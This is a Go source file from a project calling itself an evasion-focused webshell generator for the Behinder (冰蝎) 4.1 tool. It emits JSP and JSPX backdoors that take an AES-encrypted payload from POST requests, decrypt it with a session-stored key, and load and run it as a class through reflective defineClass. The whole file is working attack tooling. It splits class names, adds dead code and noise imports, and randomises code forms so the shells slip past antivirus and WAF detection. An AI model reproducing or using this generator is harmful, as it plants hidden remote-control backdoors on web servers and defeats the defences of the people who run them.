// Zack-BypassWeb - 冰蝎4.1 免杀Webshell生成框架
// Copyright (C) 2024 Zack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package generator

import (
	"fmt"
	"Zack-BypassWeb/pkg/utils"
	"strings"
)

type JSPGenerator struct {
	*Base
	isJSPX bool
}

func NewJSPGenerator(opts Options) *JSPGenerator {
	return &JSPGenerator{Base: NewBase(opts, 50), isJSPX: opts.Language == "jspx"}
}

func (g *JSPGenerator) Generate() Result {
	pass := g.GetKey()
	passMD5 := utils.MD5Half(pass)
	code := g.genBehinder(pass, passMD5)

	code = strings.ReplaceAll(code, "/*$$WAF$$*/", g.GetWAFCode())

	if g.isJSPX {
		code = g.wrapJSPX(code)
	}

	return Result{
		Code: code,
		Note: fmt.Sprintf("冰蝎4.1 %s | 密码: %s | Lv.%d", strings.ToUpper(g.Opts.Language), pass, g.Opts.EvasionLvl),
		Key:  passMD5,
	}
}

func (g *JSPGenerator) genBehinder(pass, passMD5 string) string {
	v := g.VarPool.GetN(50)

	keyVar := v[0]
	rdVar := v[1]
	b64Out := v[2]
	b64Cls := v[3]
	decObj := v[4]
	ex1 := v[5]
	ex2 := v[6]
	ciphCls := v[7]
	ciphObj := v[8]
	specCls := v[9]
	specObj := v[10]
	decVar := v[11]
	dmVar := v[12]
	payVar := v[13]
	instVar := v[14]
	bodyVar := v[15]
	sessVar := v[16]
	reqVar := v[17]

	// Lots of comments for injection
	comments := make([]string, 8)
	for i := range comments {
		comments[i] = g.Comment.Generate()
	}

	// Build inner execution block
	inner := g.buildInner(keyVar, passMD5, rdVar, b64Out, b64Cls, decObj,
		ex1, ex2, ciphCls, ciphObj, specCls, specObj,
		decVar, dmVar, payVar, instVar, bodyVar, sessVar, v, comments)

	// Lv.2+: control flow flattening
	if g.Opts.EvasionLvl >= 2 {
		inner = g.Flow.WrapCondition(inner)
	}

	// Dead code blocks
	outerDead := g.buildOuterDead(v)
	innerDead := ""
	if g.Opts.EvasionLvl >= 2 {
		innerDead = g.buildInnerDead(v)
	}
	if g.Opts.EvasionLvl >= 3 {
		innerDead += "\n" + g.buildInnerDead(v)
	}

	// Build imports
	imports := g.buildImports()

	// Build POST check
	postCheck := g.buildPostCheck(reqVar)

	// Main template
	tmpl := `@0@
<%
/*$$WAF$$*/
@1@
@2@ {
    @3@
    @4@
    @5@
}
@6@
%>`

	return Render(tmpl,
		imports,     // @0@
		postCheck,   // @1@
		comments[0], // @2@
		inner,       // @3@
		comments[1], // @4@
		innerDead,   // @5@
		outerDead,   // @6@
	)
}

func (g *JSPGenerator) buildImports() string {
	// Split imports across multiple directives, use individual classes where possible
	// Add some unused but harmless imports for noise
	noiseImports := []string{
		`<%@page import="java.io.*"%>`,
		`<%@page import="java.net.*"%>`,
		`<%@page import="java.text.*"%>`,
	}

	coreDirectives := []string{
		`<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.security.*,java.lang.reflect.*"%>`,
		Render(`<%@page import="java.util.*"%>
<%@page import="javax.crypto.*"%>
<%@page import="javax.crypto.spec.*"%>
<%@page import="java.security.*"%>
<%@page import="java.lang.reflect.*"%>`),
		Render(`<%@page import="java.util.*,javax.crypto.*"%>
<%@page import="javax.crypto.spec.*,java.security.*,java.lang.reflect.*"%>`),
	}

	result := coreDirectives[utils.RandInt(0, len(coreDirectives)-1)]

	// Lv.2+: add noise imports
	if g.Opts.EvasionLvl >= 2 {
		result += "\n" + noiseImports[utils.RandInt(0, len(noiseImports)-1)]
	}
	if g.Opts.EvasionLvl >= 3 {
		result += "\n" + noiseImports[(utils.RandInt(0, len(noiseImports)-1)+1)%len(noiseImports)]
	}

	return result
}

func (g *JSPGenerator) buildPostCheck(reqVar string) string {
	styles := []string{
		// Yoda condition
		Render(`if ("POST".equals(request.getMethod()))`),
		// Variable-based
		Render(`String @0@ = request.getMethod(); if ("POST".equals(@0@))`, reqVar),
		// Ignore case
		Render(`if ("post".equalsIgnoreCase(request.getMethod()))`),
		// Char comparison
		Render(`if (request.getMethod().charAt(0) == 'P')`),
	}
	return styles[utils.RandInt(0, len(styles)-1)]
}

func (g *JSPGenerator) buildInner(keyVar, passMD5, rdVar, b64Out, b64Cls, decObj,
	ex1, ex2, ciphCls, ciphObj, specCls, specObj,
	decVar, dmVar, payVar, instVar, bodyVar, sessVar string,
	v []string, comments []string) string {

	// Split class names to avoid literal detection
	cipherClass := g.splitClassName("javax.crypto.Cipher")
	specClass := g.splitClassName("javax.crypto.spec.SecretKeySpec")

	// Session key assignment — obfuscate "u"
	sessKey := g.buildSessionSet(sessVar, keyVar, passMD5)

	// Base64 decode block with split class names
	b64Block := g.buildBase64Block(rdVar, b64Out, b64Cls, decObj, ex1, ex2, v, comments)

	// AES decrypt + defineClass + trigger
	core := Render(`
@0@
@1@
@2@ @3@ = Class.forName(@4@);
@5@ @6@ = @3@.getMethod("getInstance", String.class).invoke(null, "AES");
@7@
@8@ @9@ = Class.forName(@10@);
@11@ @12@ = @9@.getConstructor(byte[].class, String.class).newInstance(@13@.getBytes(), "AES");
@14@.getClass().getMethod("init", int.class, java.security.Key.class).invoke(@15@, 2, @12@);
@16@
@17@
byte[] @18@ = (byte[]) @15@.getClass().getMethod("doFinal", byte[].class).invoke(@15@, @19@);
@20@
@21@ @22@ = ClassLoader.class.getDeclaredMethod(@23@, byte[].class, int.class, int.class);
@22@.setAccessible(true);
@24@ @25@ = (@24@) @22@.invoke(Thread.currentThread().getContextClassLoader(), @18@, 0, @18@.length);
@26@ @27@ = @25@.getDeclaredConstructor().newInstance();
@27@.getClass().getMethod(@28@, Object.class).invoke(@27@, pageContext);`,
		comments[2],   // @0@
		sessKey,       // @1@
		"Class",       // @2@
		ciphCls,       // @3@
		cipherClass,   // @4@
		"Object",      // @5@
		ciphObj,       // @6@
		comments[3],   // @7@
		"Class",       // @8@
		specCls,       // @9@
		specClass,     // @10@
		"Object",      // @11@
		specObj,       // @12@
		keyVar,        // @13@
		ciphObj,       // @14@
		ciphObj,       // @15@ (same instance)
		comments[4],   // @16@
		b64Block,      // @17@
		decVar,        // @18@
		b64Out,        // @19@
		comments[5],   // @20@
		"java.lang.reflect.Method", // @21@
		dmVar,         // @22@
		g.splitString(`"def"+"ineCl"+"ass"`), // @23@
		"Class",       // @24@
		payVar,        // @25@
		"Object",      // @26@
		instVar,       // @27@
		g.splitString(`"equ"+"als"`), // @28@
	)

	return core
}

func (g *JSPGenerator) buildSessionSet(sessVar, keyVar, passMD5 string) string {
	// Always assign key first, then store in session
	keyAssign := Render(`String @0@ = "@1@";`, keyVar, passMD5)

	styles := []string{
		Render(`@0@.putValue("u", @1@);`, `session`, keyVar),
		Render(`String @0@ = "u"; @1@.putValue(@0@, @2@);`, sessVar, `session`, keyVar),
		Render(`@0@.setAttribute("u", @1@);`, `session`, keyVar),
		Render(`@0@.putValue(new String(new char[]{'u'}), @1@);`, `session`, keyVar),
	}
	return keyAssign + "\n" + styles[utils.RandInt(0, len(styles)-1)]
}

func (g *JSPGenerator) buildBase64Block(rdVar, b64Out, b64Cls, decObj, ex1, ex2 string, v []string, comments []string) string {
	cls1 := g.splitClassName("java.util.Base64")
	cls2 := g.splitClassName("sun.misc.BASE64Decoder")
	cls3 := g.splitClassName("javax.xml.bind.DatatypeConverter")

	return Render(`String @0@ = request.getReader().readLine();
byte[] @1@ = null;
@2@
try {
    @3@ @4@ = Class.forName(@5@);
    @6@ @7@ = @4@.getMethod("getDecoder").invoke(null);
    @1@ = (byte[]) @7@.getClass().getMethod("decode", String.class).invoke(@7@, @0@);
} catch (@8@ @9@) {
    @10@
    try {
        @3@ @11@ = Class.forName(@12@);
        @13@ @14@ = @11@.newInstance();
        @1@ = (byte[]) @11@.getMethod("decodeBuffer", String.class).invoke(@14@, @0@);
    } catch (@8@ @15@) {
        @1@ = (byte[]) @3@.forName(@16@).getMethod("parseBase64Binary", String.class).invoke(null, @0@);
    }
}`,
		rdVar,                 // @0@
		b64Out,                // @1@
		comments[6],           // @2@
		"Class",               // @3@
		b64Cls,                // @4@
		cls1,                  // @5@
		"Object",              // @6@
		decObj,                // @7@
		"Exception",           // @8@
		ex1,                   // @9@
		comments[7],           // @10@
		v[18],                 // @11@
		cls2,                  // @12@
		"Object",              // @13@
		v[19],                 // @14@
		v[20],                 // @15@
		cls3,                  // @16@
	)
}

// splitClassName splits a fully qualified class name using string concatenation
// to avoid the literal class name appearing in source.
func (g *JSPGenerator) splitClassName(fullName string) string {
	parts := strings.Split(fullName, ".")
	// At Lv.3, split one middle part into sub-parts with + (no dot between sub-parts)
	if g.Opts.EvasionLvl >= 3 && len(parts) > 2 {
		idx := utils.RandInt(1, len(parts)-2)
		mid := parts[idx]
		if len(mid) > 4 {
			half := len(mid) / 2
			// Embed + inside the part: "cry"+"pto" (will be wrapped in outer quotes later)
			parts[idx] = mid[:half] + `"+"` + mid[half:]
		}
	}
	quoted := make([]string, len(parts))
	for i, p := range parts {
		quoted[i] = `"` + p + `"`
	}
	return strings.Join(quoted, `+"."+`)
}

// splitString returns a string split with + for method name obfuscation.
func (g *JSPGenerator) splitString(literal string) string {
	// Already comes pre-split like `"def"+"ineCl"+"ass"`
	return literal
}

func (g *JSPGenerator) buildOuterDead(v []string) string {
	deadCount := 2
	if g.Opts.EvasionLvl >= 2 {
		deadCount = 3
	}
	if g.Opts.EvasionLvl >= 3 {
		deadCount = 5
	}

	var blocks []string
	for i := 0; i < deadCount; i++ {
		blocks = append(blocks, g.genJavaDead(v, i+20))
	}
	return strings.Join(blocks, "\n")
}

func (g *JSPGenerator) buildInnerDead(v []string) string {
	return g.genJavaDead(v, utils.RandInt(25, 40))
}

func (g *JSPGenerator) genJavaDead(v []string, idx int) string {
	if idx >= len(v) {
		idx = idx % len(v)
	}

	patterns := []string{
		// Opaque predicate with system property check
		Render(`if (System.getProperty("@0@") != null && false) {
    String @1@ = "@2@" + System.getProperty("@3@");
}`,
			utils.RandString(8), v[idx], utils.RandString(5), utils.RandString(6)),

		// Dead try-catch class loading
		Render(`try {
    Class.forName("@0@.@1@.@2@");
} catch (ClassNotFoundException @3@) {
    @3@.printStackTrace();
}`,
			utils.RandString(6), utils.RandString(5), utils.RandString(4), v[idx]),

		// Environment check that never matches
		Render(`if (false && "@0@".equals(System.getenv("@1@"))) {
    Class.forName("@2@.@3@");
}`,
			utils.RandString(8), strings.ToUpper(utils.RandString(6)),
			utils.RandString(5), utils.RandString(6)),

		// Integer comparison dead code
		Render(`if (1 + 1 == 3) {
    int @0@ = @1@;
    String @2@ = Integer.toString(@0@);
}`,
			v[idx], fmt.Sprintf("%d", utils.RandInt(1000, 9999)), utils.RandString(5)),

		// Dead thread-related code
		Render(`if (Thread.activeCount() < 0) {
    Thread @0@ = new Thread(() -> System.gc());
    @0@.start();
}`,
			v[idx]),

		// Dead map operations
		Render(`if (System.currentTimeMillis() < 0L) {
    java.util.Map @0@ = new java.util.HashMap<>();
    @0@.put("@1@", "@2@");
}`,
			v[idx], utils.RandString(4), utils.RandString(5)),

		// Dead class introspection
		Render(`try {
    if (false) {
        Class @0@ = Class.forName("@1@.@2@");
        java.lang.reflect.Method[] @3@ = @0@.getDeclaredMethods();
    }
} catch (Exception @4@) {}`,
			v[idx], utils.RandString(5), utils.RandString(6), utils.RandString(4), utils.RandString(3)),

		// Dead string manipulation
		Render(`if ("@0@".length() > 99999) {
    StringBuilder @1@ = new StringBuilder();
    @1@.append("@2@");
}`,
			utils.RandString(10), v[idx], utils.RandString(6)),

		// Dead file operations
		Render(`if (new java.io.File("@0@").exists() && false) {
    String @1@ = java.nio.file.Files.readString(java.nio.file.Path.of("@2@"));
}`,
			utils.RandString(6), v[idx], utils.RandString(5)),

		// Dead reflection
		Render(`if (System.getProperties().size() < 0) {
    Class @0@ = String.class.getMethod("toString").getReturnType();
}`,
			v[idx]),

		// Dead network
		Render(`if (false) {
    java.net.URL @0@ = new java.net.URL("http://@1@.com");
    @0@.openConnection();
}`,
			v[idx], utils.RandString(6)),

		// Dead date
		Render(`if (new java.util.Date().getYear() < 0) {
    java.text.SimpleDateFormat @0@ = new java.text.SimpleDateFormat("@1@");
    @0@.format(new java.util.Date());
}`,
			v[idx], utils.RandString(5)),
	}

	return patterns[utils.RandInt(0, len(patterns)-1)]
}

func (g *JSPGenerator) wrapJSPX(code string) string {
	// Strip <%@page %> directives — we add <jsp:directive.page> instead
	code = strings.TrimSpace(code)

	// Collect ALL page imports (multiple directives → accumulate)
	var allImports []string
	for {
		idx := strings.Index(code, "<%@page")
		if idx < 0 {
			break
		}
		end := strings.Index(code[idx:], "%>")
		if end < 0 {
			break
		}
		directive := code[idx : idx+end+2]
		// Extract import attribute
		if impStart := strings.Index(directive, `import="`); impStart >= 0 {
			impVal := directive[impStart+8:]
			if impEnd := strings.Index(impVal, `"`); impEnd >= 0 {
				allImports = append(allImports, impVal[:impEnd])
			}
		}
		code = code[:idx] + code[idx+end+2:]
	}

	pageImports := strings.Join(allImports, ",")
	if pageImports == "" {
		pageImports = "java.util.*,javax.crypto.*,javax.crypto.spec.*,java.security.*,java.lang.reflect.*"
	}

	// Strip <% and %> delimiters
	code = strings.TrimSpace(code)
	code = strings.TrimPrefix(code, "<%")
	code = strings.TrimSuffix(code, "%>")
	code = strings.TrimSpace(code)

	return Render(`<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
<jsp:directive.page import="@0@"/>
<jsp:scriptlet><![CDATA[
@1@
]]></jsp:scriptlet>
</jsp:root>`, pageImports, code)
}
